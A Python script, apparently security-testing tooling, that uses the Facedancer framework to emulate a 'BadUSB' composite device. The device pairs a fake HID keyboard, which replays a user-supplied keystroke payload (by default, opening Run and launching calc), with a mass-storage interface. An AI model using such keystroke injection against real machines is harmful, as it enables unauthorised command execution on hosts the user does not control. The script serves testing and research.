#!/usr/bin/env python3
"""Expose a composite HID keyboard + mass storage device."""

import argparse
import logging
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT / "legacy-applets") not in sys.path:
    sys.path.insert(0, str(ROOT / "legacy-applets"))

from facedancer import FacedancerUSBApp
from facedancer.USB import USB
from facedancer.USBConfiguration import USBConfiguration
from facedancer.USBDevice import USBDevice
from facedancer.USBEndpoint import USBEndpoint
from facedancer.USBInterface import USBInterface
from facedancer.classes.hid.keyboard import KeyboardKeys

from USBMassStorage import USBMassStorageInterface

from mass_storage_corruptor import FileBackedCorruptImage


def build_keyboard_reports(payload: str, idle_frames: int):
    reports = [b"\x00" * 8 for _ in range(idle_frames)]

    for char in payload:
        if char == "\n":
            shift = 0
            scancode = KeyboardKeys.ENTER
        else:
            shift, scancode = KeyboardKeys.get_scancode_for_ascii(char)

        modifier = shift if shift else 0
        reports.append(bytes([modifier, 0, scancode, 0, 0, 0, 0, 0]))
        reports.append(b"\x00" * 8)

    return reports


class BadUSBKeyboardInterface(USBInterface):
    """Minimal HID keyboard interface that replays a prepared payload."""

    hid_descriptor = b"\x09\x21\x11\x01\x00\x01\x22\x3f\x00"
    report_descriptor = (
        b"\x05\x01\x09\x06\xA1\x01\x05\x07\x19\xE0\x29\xE7"
        b"\x15\x00\x25\x01\x75\x01\x95\x08\x81\x02\x95\x01"
        b"\x75\x08\x81\x01\x95\x05\x75\x01\x05\x08\x19\x01"
        b"\x29\x05\x91\x02\x95\x01\x75\x03\x91\x01\x95\x06"
        b"\x75\x08\x15\x00\x25\x65\x05\x07\x19\x00\x29\x65"
        b"\x81\x00\xC0"
    )

    def __init__(self, payload_reports, verbose=0):
        descriptors = {
            USB.desc_type_hid: self.hid_descriptor,
            USB.desc_type_report: self.report_descriptor,
        }

        endpoint = USBEndpoint(
            2,
            USBEndpoint.direction_in,
            USBEndpoint.transfer_type_interrupt,
            USBEndpoint.sync_type_none,
            USBEndpoint.usage_type_data,
            8,
            5,
            self.handle_buffer_available,
        )

        super().__init__(0, 0, 3, 0, 0, 0, verbose, [endpoint], descriptors)
        self.reports = payload_reports

    @property
    def endpoint(self):
        return self.endpoints[0]

    def handle_buffer_available(self):
        if not self.reports:
            return

        report = self.reports.pop(0)
        self.endpoint.send(report)


class CompositeDevice(USBDevice):
    def __init__(self, maxusb_app, disk_image, payload_reports, verbose=0):
        self.keyboard = BadUSBKeyboardInterface(payload_reports, verbose=verbose)
        self.storage = USBMassStorageInterface(disk_image, verbose=verbose)
        self.storage.number = 1

        config = USBConfiguration(
            1,
            "Composite HID+UMS",
            [self.keyboard, self.storage],
            attributes=0xC0,
            max_power=250,
        )

        super().__init__(
            maxusb_app,
            0,
            0,
            0,
            64,
            0x1d50,
            0xDEAD,
            0x0001,
            "FaceDancer",
            "Composite Dropper",
            "BADUSB",
            [config],
            verbose=verbose,
        )


def main_cli():
    parser = argparse.ArgumentParser(description="Composite HID + Mass Storage emulator")
    parser.add_argument("image", type=Path, help="Disk image presented via the mass storage interface")
    parser.add_argument("--payload", default="WINDOWS r\ncalc\n",
                        help="Keystrokes to replay via the HID interface")
    parser.add_argument("--idle-frames", type=int, default=50,
                        help="Number of idle HID frames before typing starts")
    parser.add_argument("--log", default="INFO", help="Logging level")

    args = parser.parse_args()
    logging.basicConfig(level=getattr(logging, args.log.upper(), logging.INFO),
                        format="[%(levelname)s] %(message)s")

    reports = build_keyboard_reports(args.payload, args.idle_frames)
    disk_image = FileBackedCorruptImage(args.image, flip_probability=0.0)

    app = FacedancerUSBApp(verbose=1)
    device = CompositeDevice(app, disk_image, reports, verbose=2)

    device.connect()

    try:
        device.run()
    except KeyboardInterrupt:
        pass
    finally:
        device.disconnect()
        disk_image.close()


if __name__ == "__main__":
    main_cli()
